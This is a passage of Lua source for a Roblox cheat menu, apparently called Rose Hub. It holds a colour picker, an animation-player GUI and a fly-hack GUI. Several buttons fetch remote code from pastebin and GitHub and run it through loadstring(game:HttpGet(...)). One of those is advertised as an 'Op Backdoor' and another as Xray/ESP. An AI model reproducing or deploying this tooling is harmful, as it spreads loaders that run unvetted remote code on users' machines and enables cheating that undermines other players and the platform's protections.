    colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
    colorChoice.Text = ""
    colorChoice.AutoButtonColor = false
    
    local row = 0
    local column = 0
    for i,v in pairs(basicColors) do
        local newColor = colorChoice:Clone()
        newColor.BackgroundColor3 = v
        newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
        
        newColor.MouseButton1Click:Connect(function()
            red,green,blue = v.r,v.g,v.b
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            updateColor()
        end)	
        
        newColor.Parent = basicColorsFrame
        column = column + 1
        if column == 6 then row = row + 1 column = 0 end
    end
    
    row = 0
    column = 0
    for i = 1,12 do
        local color = customColors[i] or Color3.new(0,0,0)
        local newColor = colorChoice:Clone()
        newColor.BackgroundColor3 = color
        newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
        
        newColor.MouseButton1Click:Connect(function()
            local curColor = customColors[i] or Color3.new(0,0,0)
            red,green,blue = curColor.r,curColor.g,curColor.b
            hue,sat,val = Color3.toHSV(curColor)
            updateColor()
        end)
        
        newColor.MouseButton2Click:Connect(function()
            customColors[i] = chosenColor
            newColor.BackgroundColor3 = chosenColor
        end)
        
        newColor.Parent = customColorsFrame
        column = column + 1
        if column == 6 then row = row + 1 column = 0 end
    end
    
    pickerTopBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
            local dragOffX,dragOffY = mouse.X-pickerTopBar.AbsolutePosition.X,mouse.Y-pickerTopBar.AbsolutePosition.Y
            
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
            
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    pickerGui.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
                end
            end)
        end
    end)
    
    okButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor) end pickerGui.Visible = false savedColor = chosenColor colorPickerOpen = false end)
    okButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.4 end end)
    okButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0 end end)
    
    cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end pickerGui.Visible = false updateBack(savedColor, backDrop) colorPickerOpen = false end)
    cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
    cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)
    
    closeButton.MouseButton1Click:Connect(function() pickerGui.Visible = false updateBack(savedColor, backDrop) colorPickerOpen = false end)
    
    updateColor()
    
    newMt.SetColor = function(self,color)
        red,green,blue = color.r,color.g,color.b
        hue,sat,val = Color3.toHSV(color)
        updateColor()
    end
    
    newMt.Gui = rootGui
    
    return newMt
end
--end

local ColorPickInstance = ColorPicker.new()

local rainbowColors = {
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 255, 255),
}

local rainbow = false
local customRainbow = false
local rainbowReset = false
local rainbowStart = 1
local currentRainbow = nil

spawn(function()
    while wait() do
        if rainbow == true then
            for i,v in pairs(rainbowColors) do
                local start = rainbowColors[i]
                local rEnd = i + 1
                if not rainbowColors[rEnd] then
                    rEnd = 1
                end
                if customRainbow == true then
                    local back = screenGui.Top.Main.BackgroundColor3
                    start = back
                end
                for num = rainbowCount, 1, -1 do
                    currentRainbow = start:Lerp(rainbowColors[rEnd], (rainbowCount - num)/rainbowCount)
                    if rainbow == true then
                        updateBack(currentRainbow)
                    else
                        break
                    end
                    wait()
                end
                customRainbow = false
            end
            if rainbowReset == true then
                rainbowReset = false
                rainbow = false
                currentRainbow = screenGui.Top.Main.BackgroundColor3
                for num = rainbowCount, 1, -1 do
                    currentRainbow = currentRainbow:Lerp(savedColor, (rainbowCount - num)/rainbowCount)
                    updateBack(currentRainbow)
                    if rainbow == true then
                        rainbowReset = false
                        break
                    end
                    wait()
                end
                wait()
            end
        end
    end
end)--]]

--Settings Tab
--Open Colour Picker
screenGui.Main.Top.Important.SettingsTab.colorpickopen.MouseButton1Up:Connect(function()
    colourpicker.Enabled = true
end)

--Reset GUI
screenGui.Main.Top.Important.SettingsTab.ResetGui.MouseButton1Up:Connect(function()

end)

--Save Settings
screenGui.Main.Top.Important.SettingsTab.SaveSettings.MouseButton1Up:Connect(function()

end)

--Colour Picker Background On
screenGui.Main.Top.Important.SettingsTab.PickerBackgroundOn.MouseButton1Up:Connect(function()

end)

--Colour Picker Background Off
screenGui.Main.Top.Important.SettingsTab.PickerBackgroundOff.MouseButton1Up:Connect(function()

end)

--Close
screenGui.Main.Top.Close.MouseButton1Up:connect(function()
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    screenGui.Main:TweenSize(UDim2.new(0, 0, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    wait()
    screenGui.Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.25)
    wait(0.25)
end)

--Open
screenGui.Open.MouseButton1Up:connect(function()
    screenGui.Open:TweenPosition(UDim2.new(0, -75, 0.75, 0), "Out", "Quad", 0.25)
    wait(0.25)
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    wait()
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 347), "Out", "Quad", 0.5)
    wait(0.5)
end)

--Start Intro
intro.Intro.Size = UDim2.new(0, 0, 0, 25)

intro.Intro.Top.Visible = false
intro.Intro.Loading.Visible = false
intro.Intro.Motto.Visible = false
intro.Intro.Background.Visible = false

wait(0)

intro.Enabled = true

intro.Intro:TweenSize(UDim2.new(0, 376, 0, 25), "Out", "Quad", 0.5)

wait(0.6)
intro.Intro.Top.Visible = true
intro.Intro:TweenSize(UDim2.new(0, 376, 0, 169), "Out", "Quad", 0.5)
wait(0.1)
intro.Intro.Motto.Visible = true
wait(0.1)
intro.Intro.Background.Visible = true
wait(0.2)
intro.Intro.Loading.Visible = true
wait(0.5)

intro.Intro.Background.Bar:TweenSize(UDim2.new(1, 0, 0, 33), "Out", "Quad", 3)

--End Intro
wait(1)

screenGui.Main.Size = UDim2.new(0, 0, 0, 31)
screenGui.Open.Position = UDim2.new(0, -75, 0.75, 0)

wait(3)

wait(0.5)
intro.Intro:TweenSize(UDim2.new(0, 376, 0, 25), "Out", "Quad", 0.5)
wait()
intro.Intro.Loading.Visible = false
wait(0.1)
intro.Intro.Background.Visible = false
wait(0.2)
intro.Intro.Motto.Visible = false
wait(0.5)
intro.Intro:TweenSize(UDim2.new(0, 0, 0, 25), "Out", "Quad", 0.4)
intro.Intro.Top.Visible = false
wait(1)
intro:Destroy()

wait(0.5)

screenGui.Enabled = true

screenGui.Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.5)
wait(0.5)

print("Rose Hub process finished at " .. round(tick()-start) .. " milliseconds.")
end)


Section:NewButton("R6 Gui animation", "Animation cool", function()
save = nil
c3 = function(r,g,b) return Color3.new(r/255,g/255,b/255) end

--do something ro get save file

if not save then
	save = {
		ui = {
			highlightcolor = c3(33, 122, 255);
			errorcolor = c3(255, 0, 0);
			--AnimationPriority colors
			core = c3(65, 65, 65);
			idle = c3(134, 200, 230);
			movement = c3(114, 230, 121);
			action = c3(235, 235, 235);
		};
		preferences = {
			
		};
		custom_animations = {
			template = {
				Title = "";
				AnimationId = "rbxassetid://";
				Image = "rbxassetid://2151539455"; --not required
				Speed = 1;
				Time = 0;
				Weight = 1;
				Loop = false;
				R6 = true;
				Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
			};
		};
	}
end

lp = game:GetService("Players").LocalPlayer
m = lp:GetMouse()

function getHumanoid()
	if not lp.Character then return nil end
	return lp.Character:FindFirstChildWhichIsA("Humanoid")
end
screengui = game:GetObjects("rbxassetid://02159099015")[1]
screengui.Parent = game:GetService("CoreGui")
main = screengui.Topbar.Main

mainframe = main.MainFrame
scrollframe = mainframe.ScrollingFrame
items = scrollframe.Items
search = scrollframe.SearchFrame.Search
searchbutton = scrollframe.SearchFrame.ImageLabel.TextButton
searchframe = scrollframe.SearchFrame

preview = main.Preview
previewimage = preview.Image
previewtitle = preview.Title
previewdesc = preview.Desc

function draggable(gObj)
	local UserInputService = game:GetService("UserInputService")

	local gui = gObj
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
function tween(object,style,direction,t,goal)
    local tweenservice = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(t,Enum.EasingStyle[style],Enum.EasingDirection[direction])
    local tween = tweenservice:Create(object,tweenInfo,goal)
    tween:Play()
    return tween
end

draggable(screengui.Topbar)

function checkIfStudio()
	return game.Name ~= "Game"
end

if not checkIfStudio() then
	print'Client is not in Roblox studio'
	--main.Size = UDim2.new(0.398, 0, 0.477, 0)
end

search.Changed:connect(function(p)
	local n = 0
	for i,v in pairs (items:GetChildren()) do
		if v:IsA("TextButton") and not string.find(v.Title.Text:lower(), search.Text:lower()) then
			v.Visible = false
		elseif v:IsA("TextButton") and string.find(v.Title.Text:lower(), search.Text:lower()) then
			v.Visible = true
			n = n + 1
		end
	end
	if p == "Text" then
		if n > 0 then
			tween(searchframe, "Sine", "Out", 0.25, {
				BorderColor3 = save.ui.highlightcolor;
			})
			wait(0.25)
			tween(searchframe, "Sine", "In", 0.5, {
				BorderColor3 = c3(58, 58, 58);
			})
		else
			tween(searchframe, "Sine", "Out", 0.25, {
				BorderColor3 = save.ui.errorcolor;
			})
			wait(0.25)
			tween(searchframe, "Sine", "In", 0.5, {
				BorderColor3 = c3(58, 58, 58);
			})
		end
	end
end)

spawn(function()
	while wait(10) do
		--auto-save every 10 seconds
	end
end)
cam = workspace.CurrentCamera

running = {}
popAnims = {
	armturbine = {
		Title = "Arm Turbine";
		AnimationId = "rbxassetid://259438880";
		Speed = 1.5;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	weirdsway = {
		Title = "Weird Sway";
		AnimationId = "rbxassetid://248336677";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	weirdfloat = {
		Title = "Weird Float";
		AnimationId = "rbxassetid://248336459";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	weirdpose = {
		Title = "Weird Pose";
		AnimationId = "rbxassetid://248336163";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	penguinslide = {
		Title = "Penguin Slide";
		AnimationId = "rbxassetid://282574440";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	scream = {
		Title = "Scream";
		AnimationId = "rbxassetid://180611870";
		Speed = 1.5;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	crouch = {
		Title = "Crouch";
		AnimationId = "rbxassetid://182724289";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
happydance = {
		Title = "Happy Dance";
		AnimationId = "rbxassetid://248335946";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	floatinghead = {
		Title = "Floating Head";
		AnimationId = "rbxassetid://121572214";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	balloonfloat = {
		Title = "Balloon Float";
		AnimationId = "rbxassetid://148840371";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	pinchnose = {
		Title = "Pinch Nose";
		AnimationId = "rbxassetid://30235165";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	goal = {
		Title = "Goal!";
		AnimationId = "rbxassetid://28488254";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	cry = {
		Title = "Cry";
		AnimationId = "rbxassetid://180612465";
		Speed = 0;
		Time = 1.5;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	partytime = {
		Title = "Party Time";
		AnimationId = "rbxassetid://33796059";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	moondance = {
Title = "Moon Dance";
		AnimationId = "rbxassetid://27789359";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	insanelegs = {
		Title = "Insane Legs";
		AnimationId = "rbxassetid://87986341";
		Speed = 99;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	rotation = {
		Title = "Rotation";
		AnimationId = "rbxassetid://136801964";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	insanerotation = {
		Title = "Insane Rotation";
		AnimationId = "rbxassetid://136801964";
		Speed = 99;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	roar = {
		Title = "Roar";
		AnimationId = "rbxassetid://163209885";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	spin = {
		Title = "Spin";
		AnimationId = "rbxassetid://188632011";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	zombiearms = {
		Title = "Zombie Arms";
		AnimationId = "rbxassetid://183294396";
		Speed = 0;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	insane = {
		Title = "Insane";
		AnimationId = "rbxassetid://33796059";
		Speed = 99;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	neckbreak = {
Title = "Neck Break";
		AnimationId = "rbxassetid://35154961";
		Speed = 0;
		Time = 2;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	headdetach = {
		Title = "Head Detach";
		AnimationId = "rbxassetid://35154961";
		Speed = 0;
		Time = 3;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	idle = {
		Title = "Idle";
		AnimationId = "rbxassetid://180435571";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	charleston = {
		Title = "Charleston";
		AnimationId = "rbxassetid://429703734";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
}
robloxOwns = {}

ownerOwns = {}

customAnims = {}

function getOwnedAnimations(userid)
	local httpserv = game:GetService("HttpService")
	local owned = httpserv:GetAsync("https://inventory.roblox.com/v1/users/"..userid.."/inventory/AnimationpageNumber=1&itemsPerPage=10", true)
	return owned
end


function getAnim(name)
	return popAnims[name] or customAnims[name]
end
function runAnim(info, humanoid)
	local animation = Instance.new("Animation")
	animation.AnimationId = info.AnimationId
	
	local animtrack = humanoid:LoadAnimation(animation)
	table.insert(running,animtrack)
	animtrack.Priority = info.Priority
	animtrack.Looped = info.Loop
	
	animtrack:Play()
	animtrack:AdjustSpeed(info.Speed)
	animtrack:AdjustWeight(info.Weight)
	animtrack.TimePosition = info.Time
	
	animtrack.Stopped:connect(function()
		for i = 1,#running do
			if running[i] == animtrack then
				table.remove(running,i)
			end
		end
	end)
	
	return animtrack
end
template = items.Template
template.Parent = nil

function clear()
	for i,v in pairs (items:GetChildren()) do
		if v:IsA("TextButton") then
			v:Destroy()
		end
	end
end

--[[
	idle = {
		Title = "Idle";
		AnimationId = "rbxassetid://180435571";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
--]]

function createbutton(v)
	local temp = template:Clone()
	temp.Parent = items
	temp.Name = v.Title
	temp.Title.Text = v.Title
	temp.Image.Image = v.Image or "rbxassetid://2151539455"
	if temp.Image.Image == "rbxassetid://2151539455" then
		temp.Image.ImageColor3 = (v.Priority == 0 and save.ui.idle) or (v.Priority == 1 and save.ui.movement) or (v.Priority == 2 and save.ui.action) or (v.Priority == 1000 and save.ui.core)
	else
		temp.Image.ImageColor3 = Color3.new(1,1,1)
	end
	temp.LayoutOrder = math.random(1,10000)
	
	temp.Settings.AnimationId.Value = v.AnimationId
	temp.Settings.Loop.Value = v.Loop
	temp.Settings.Priority.Value = v.Priority
	temp.Settings.R6.Value = v.R6
	temp.Settings.Speed.Value = v.Speed
	temp.Settings.Weight.Value = v.Weight
	temp.Settings.Time.Value = v.Time
	
	temp.MouseEnter:connect(function()
		preview.Title.Text = v.Title
		preview.Desc.Text = "Speed: "..tostring(v.Speed).."\nPriority: "..tostring(v.Priority).."\nR6 Rig: "..tostring(v.R6).."\nAnimID: "..tostring(v.AnimationId).."\n\n"..(v.Description or "No description provided")
		
		preview.Image.Image = v.Image or "rbxassetid://2151539455"
		if preview.Image.Image == "rbxassetid://2151539455" then
			preview.Image.ImageColor3 = (v.Priority == 0 and save.ui.idle) or (v.Priority == 1 and save.ui.movement) or (v.Priority == 2 and save.ui.action) or (v.Priority == 1000 and save.ui.core)
		else
			preview.Image.ImageColor3 = Color3.new(1,1,1)
		end
	end)
	temp.MouseButton1Click:connect(function()
		temp.Border.ImageColor3 = save.ui.highlightcolor
		for i,anim in pairs (running) do
			if anim.Animation.AnimationId == v.AnimationId then
				anim:Stop()
				return
			end
		end
temp.Border.Visible = true
		local rAnim = runAnim(v, getHumanoid())
		rAnim.Stopped:connect(function()
			temp.Border.Visible = false
		end)
	end)
	
	return temp
end

dropdown = mainframe.ScrollingFrame.DropdownFrame
elements = dropdown.HoldContentsFrame.Frame.Elements
dropdownenabled = true

tween(dropdown.HoldContentsFrame.Frame, "Linear", "In", 0, {
	Position = UDim2.new(0,0,-1,0)
})
dropdown.HoldContentsFrame.Frame.Visible = false

dropdowndeactivate = screengui.DropdownDeactivate
dropdowndeactivate.Visible = false

function hideddown()
	tween(dropdown.HoldContentsFrame.Frame, "Linear", "In", 0, {
		Position = UDim2.new(0,0,-1,0)
	})
	dropdown.HoldContentsFrame.Frame.Visible = false
	dropdowndeactivate.Visible = false
	dropdownenabled = true
	
	for i,e in pairs (elements:GetChildren()) do
		if e:IsA("TextButton") then
			e.BackgroundColor3 = c3(46,46,46)
		end
	end
end

dropdown.MouseButton1Click:connect(function()
	print'ddownclick'
	dropdownenabled = not dropdownenabled
	if dropdownenabled then
		hideddown()
	else
		tween(dropdown.HoldContentsFrame.Frame, "Linear", "In", 0.3, {
			Position = UDim2.new(0,0,0,0)
		})
		dropdown.HoldContentsFrame.Frame.Visible = true
		dropdowndeactivate.Visible = true
	end
end)

dropdowndeactivate.MouseButton1Down:connect(function()
	hideddown()
end)

for i,v in pairs (elements:GetChildren()) do
	if v:IsA("TextButton") then
		v.MouseEnter:connect(function()
			for i,e in pairs (elements:GetChildren()) do
				if e:IsA("TextButton") then
					e.BackgroundColor3 = c3(46,46,46)
				end
			end
			v.BackgroundColor3 = save.ui.highlightcolor
		end)
		v.MouseButton1Click:connect(function()
			hideddown()
			dropdown.TextLabel.Text = v.Name
			sort(v.Name)
		end)
	end
end

function sort(category)
	clear()
	if category == "Popular" then
		for i,v in pairs (popAnims) do
			local temp = createbutton(v)
		end
	elseif category == "By Roblox" then
		
	end
end

game:GetService('RunService').RenderStepped:connect(function()
	items.Parent.CanvasSize = UDim2.new(0,0,0,items.GridLayout.AbsoluteContentSize.Y + 50)
end)

sort("Popular")
end)


Section:NewButton("Screen GUI", "Xray,esp, and more", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/Ekn7geJz'))()
end)

Section:NewButton("Syntax hub Key: SyntaxV3Free", "Gives you Syntax Hub", function()
shared.colors = {

    Icons = Color3.fromRGB(0,255,149),

    Version = Color3.fromRGB(0,255,149),

    Text = Color3.fromRGB(255,255,255),

    Description = Color3.fromRGB(125,125,125),

    TabList = Color3.fromRGB(30,30,30),

    Scripts = Color3.fromRGB(30,30,30),

    Back = Color3.fromRGB(25,25,25),

    Glow = Color3.fromRGB(0,0,0),

}

shared.transparency = {

    Version = 0,

    Text = 0,

    Description = 0,

    Icons = 0,

    Back = 0,

    Glow = 0.5,

    TabList = 0,

    Scripts = 1,

}



loadstring(game:HttpGet("https://raw.githubusercontent.com/Memeboiyot/Syntax-V3-Free/main/Syntax%20v3    ", true))()
end)

Section:NewButton("Terminate HUB", "Animtion GUI", function()
    _G.Velocity = Vector3.new(30,0,0) loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatek/ProjectTerm/main/main.lua"))()
end)

Section:NewButton("Moon V10", "Op Backdoor", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()
end)

Section:NewButton("Fly Gui V3", "fly", function()
local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local up = Instance.new("TextButton")
local down = Instance.new("TextButton")
local onof = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local plus = Instance.new("TextButton")
local speed = Instance.new("TextLabel")
local mine = Instance.new("TextButton")
local closebutton = Instance.new("TextButton")
local mini = Instance.new("TextButton")
local mini2 = Instance.new("TextButton")

main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
main.ResetOnSpawn = false

Frame.Parent = main
Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "up"
up.Parent = Frame
up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
up.Size = UDim2.new(0, 44, 0, 28)
up.Font = Enum.Font.SourceSans
up.Text = "UP"
up.TextColor3 = Color3.fromRGB(0, 0, 0)
up.TextSize = 14.000

down.Name = "down"
down.Parent = Frame
down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
down.Position = UDim2.new(0, 0, 0.491228074, 0)
down.Size = UDim2.new(0, 44, 0, 28)
down.Font = Enum.Font.SourceSans
down.Text = "DOWN"
down.TextColor3 = Color3.fromRGB(0, 0, 0)
down.TextSize = 14.000

onof.Name = "onof"
onof.Parent = Frame
onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
onof.Size = UDim2.new(0, 56, 0, 28)
onof.Font = Enum.Font.SourceSans
onof.Text = "fly"
onof.TextColor3 = Color3.fromRGB(0, 0, 0)
onof.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Fly GUI V3"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

plus.Name = "plus"
plus.Parent = Frame
plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
plus.Position = UDim2.new(0.231578946, 0, 0, 0)
plus.Size = UDim2.new(0, 45, 0, 28)
plus.Font = Enum.Font.SourceSans
plus.Text = "+"
plus.TextColor3 = Color3.fromRGB(0, 0, 0)
plus.TextScaled = true
plus.TextSize = 14.000
plus.TextWrapped = true

speed.Name = "speed"
speed.Parent = Frame
speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
speed.Size = UDim2.new(0, 44, 0, 28)
speed.Font = Enum.Font.SourceSans
speed.Text = "1"
speed.TextColor3 = Color3.fromRGB(0, 0, 0)
speed.TextScaled = true
speed.TextSize = 14.000
speed.TextWrapped = true

mine.Name = "mine"
mine.Parent = Frame
mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
mine.Size = UDim2.new(0, 45, 0, 29)
mine.Font = Enum.Font.SourceSans
mine.Text = "-"
mine.TextColor3 = Color3.fromRGB(0, 0, 0)
mine.TextScaled = true
mine.TextSize = 14.000
mine.TextWrapped = true

closebutton.Name = "Close"
closebutton.Parent = main.Frame
closebutton.BackgroundColor3 = Color3.fromRGB(225, 25, 0)
closebutton.Font = "SourceSans"
closebutton.Size = UDim2.new(0, 45, 0, 28)
closebutton.Text = "X"
closebutton.TextSize = 30
closebutton.Position =  UDim2.new(0, 0, -1, 27)

mini.Name = "minimize"
mini.Parent = main.Frame
mini.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini.Font = "SourceSans"
mini.Size = UDim2.new(0, 45, 0, 28)
mini.Text = "-"
mini.TextSize = 40
mini.Position = UDim2.new(0, 44, -1, 27)

mini2.Name = "minimize2"
mini2.Parent = main.Frame
mini2.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini2.Font = "SourceSans"
mini2.Size = UDim2.new(0, 45, 0, 28)
mini2.Text = "+"
mini2.TextSize = 40
mini2.Position = UDim2.new(0, 44, -1, 57)
mini2.Visible = false

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Fly GUI V3";
	Text = "By me_ozone and Quandale The Dinglish XII#3550";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 5;

Frame.Active = true -- main = gui
Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
